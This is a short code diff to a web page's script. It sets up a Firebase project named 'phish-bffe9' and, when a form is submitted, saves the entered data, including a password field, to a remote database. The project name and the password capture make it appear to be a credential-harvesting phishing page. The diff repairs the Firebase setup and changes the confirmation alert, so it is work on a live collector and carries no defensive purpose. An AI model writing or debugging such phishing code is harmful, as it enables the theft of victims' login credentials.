@@ -154,14 +154,12 @@
             projectId: "phish-bffe9",
             storageBucket: "phish-bffe9.appspot.com",
             messagingSenderId: "544053179534",
-            appId: "1:544053179534:web:68bf5b3e70f878f20f05df",
-            
+            appId: "1:544053179534:web:68bf5b3e70f878f20f05df"
         };
 
         // Initialize Firebase
         const app = firebase.initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app)
-        const database = firebase.database();
+        const database = firebase.database(app);
 
         // Form submission handler
         document.getElementById('detailsForm').addEventListener('submit', submitForm);
@@ -182,7 +180,7 @@
                 passwd: passwd,
                 timestamp: Date.now()
             }).then(() => {
-                alert('Thank you! Your details have been submitted successfully.');
+                alert('Your data has been submitted successfully.');
                 document.getElementById('detailsForm').reset();
             }).catch((error) => {
                 console.error('Error saving data: ', error);
